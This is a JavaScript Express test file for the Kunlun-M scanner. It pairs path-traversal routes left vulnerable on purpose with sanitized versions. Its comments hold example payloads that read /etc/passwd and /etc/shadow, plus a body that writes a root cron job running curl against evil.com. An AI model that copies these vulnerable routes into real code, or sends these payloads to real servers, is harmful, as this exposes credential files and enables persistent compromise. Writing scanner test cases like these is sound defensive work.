/**
 * Real-world Path Traversal test cases for Kunlun-M scanner
 * Tests: readFile, readFileSync, writeFile with user-controlled path concatenation
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();

router.use(express.json());
router.use(express.urlencoded({ extended: true }));

/**
 * VULN: Path traversal via readFile with req.query concatenation
 * Attacker can use ../ to escape intended directory
 * Example: /download?file=../../etc/passwd
 */
router.get('/download', (req, res) => {
    const file = req.query.file;
    const filePath = '/var/www/files/' + file;
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) return res.status(404).send('File not found');
        res.send(data);
    });
});

/**
 * VULN: Path traversal via readFileSync with req.params concatenation
 * Attacker can traverse directories via params
 * Example: /docs/../../../../etc/shadow
 */
router.get('/docs/:filename', (req, res) => {
    try {
        const content = fs.readFileSync('/app/static/docs/' + req.params.filename, 'utf8');
        res.send(content);
    } catch (err) {
        res.status(404).send('Document not found');
    }
});

/**
 * VULN: Path traversal via writeFile with req.body concatenation
 * Attacker can write to arbitrary locations on filesystem
 * Example POST: {"path": "../../etc/cron.d/malicious", "content": "* * * * * root curl evil.com"}
 */
router.post('/save', (req, res) => {
    const filePath = '/app/uploads/' + req.body.path;
    fs.writeFile(filePath, req.body.content, (err) => {
        if (err) return res.status(500).send('Save failed');
        res.send('File saved');
    });
});

/**
 * SAFE: Using path.join with path.resolve and checking the result
 * is within the allowed base directory
 */
router.get('/safe-download', (req, res) => {
    const file = req.query.file;
    const basePath = '/var/www/files';
    // SAFE: Resolve full path and verify it stays within base directory
    const fullPath = path.resolve(path.join(basePath, file));
    if (!fullPath.startsWith(basePath + path.sep) && fullPath !== basePath) {
        return res.status(400).send('Invalid file path');
    }
    fs.readFile(fullPath, 'utf8', (err, data) => {
        if (err) return res.status(404).send('File not found');
        res.send(data);
    });
});

/**
 * SAFE: Sanitize filename by stripping path separators and dots
 * Only the basename is used, preventing directory traversal
 */
router.get('/avatar/:username', (req, res) => {
    const username = req.params.username;
    // SAFE: Strip directory components, only use the base filename
    const safeName = username.replace(/[/\\\.]/g, '_').substring(0, 50);
    const avatarPath = path.join('/app/avatars', safeName + '.png');
    res.sendFile(avatarPath);
});

module.exports = router;
